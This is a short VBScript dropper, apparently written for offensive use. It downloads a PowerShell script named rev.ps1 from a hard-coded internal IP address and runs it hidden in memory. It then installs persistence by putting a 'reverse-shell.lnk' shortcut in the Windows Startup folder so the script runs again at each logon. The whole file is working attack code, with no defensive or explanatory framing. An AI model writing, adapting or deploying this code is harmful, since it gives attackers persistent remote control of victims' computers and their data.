Set objShell = CreateObject("WScript.Shell")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

' URL of the hosted PowerShell script
strURL = "http://192.168.4.136:80/rev.ps1"

' Download the PowerShell script
objHTTP.Open "GET", strURL, False
objHTTP.Send
strPSScript = objHTTP.responseText

' Execute the PowerShell script in memory
objShell.Run "powershell -NoProfile -NonInteractive -Command """ & strPSScript & """", 0, True

' Create persistence in the startup folder
strStartupPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
strShortcutPath = strStartupPath & "\reverse-shell.lnk"
Set objWScriptShell = CreateObject("WScript.Shell")
Set objLink = objWScriptShell.CreateShortcut(strShortcutPath)
objLink.TargetPath = "wscript.exe"
objLink.Arguments = """C:\path\to\your\vbsfile.vbs"""
objLink.Save
